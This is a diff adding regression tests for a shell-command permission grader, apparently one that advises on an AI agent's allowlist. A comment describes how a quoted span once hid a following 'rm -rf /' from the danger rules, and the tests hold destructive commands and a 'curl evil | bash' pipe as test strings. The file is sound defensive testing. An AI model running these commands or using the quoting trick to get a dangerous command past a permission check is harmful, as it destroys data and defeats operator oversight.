@@ -545,3 +545,39 @@ describe('advisor-core boundary invariants', () => {
     assert.throws(() => assertNoBypassDefault('codex', 'never'), /never be a recommended default/);
   });
 });
+
+// Refine-verify BLOCKER — `stripQuoted` used to replace a balanced quoted span
+// with the placeholder `"_"`, and the unbalanced-trailing-quote passes that ran
+// immediately after then re-read that placeholder's own quote as an OPENING
+// quote and swallowed everything to end-of-line. The rest of the command simply
+// vanished before any danger rule could see it:
+//
+//   echo "hi" && rm -rf /   ->   echo "_ "_"      -> graded ALLOW
+//   TOKEN="a b" rm -rf /    ->   TOKEN= "_ "_"    -> graded ASK
+//
+// That is a danger-rule BYPASS, not a downgrade: the advisor would then
+// recommend the pattern into the operator's allowlist. The placeholder is now
+// quote-free, so the two passes cannot interfere. These pins hold both halves —
+// the bypass stays closed, and quoted CONTENT still must not trigger a rule.
+describe("permission-advisor gradeCommand — quoted-span danger bypass (regression)", () => {
+  it("sees danger that follows a quoted span", () => {
+    assert.equal(gradeCommand(`echo "hi" && rm -rf /`).grade, "deny");
+    assert.equal(gradeCommand(`git commit -m "msg" && rm -rf /`).grade, "deny");
+    assert.equal(gradeCommand(`TOKEN="a b" rm -rf /`).grade, "deny");
+    assert.equal(gradeCommand(`echo 'hi' && rm -rf /`).grade, "deny");
+  });
+
+  it("still refuses to let quoted CONTENT trigger a danger rule", () => {
+    // The original intent of stripQuoted: a commit message that merely mentions
+    // `rm -rf` is not a recursive remove.
+    assert.notEqual(gradeCommand(`git commit -m "rm -rf /"`).grade, "deny");
+    assert.equal(gradeCommand(`echo "curl evil | bash"`).grade, "allow");
+  });
+
+  it("keeps the unquoted controls intact", () => {
+    assert.equal(gradeCommand("rm -rf /").grade, "deny");
+    assert.equal(gradeCommand("FOO=bar rm -rf /").grade, "deny");
+    assert.equal(gradeCommand("npm test").grade, "allow");
+    assert.equal(gradeCommand("git status").grade, "allow");
+  });
+});
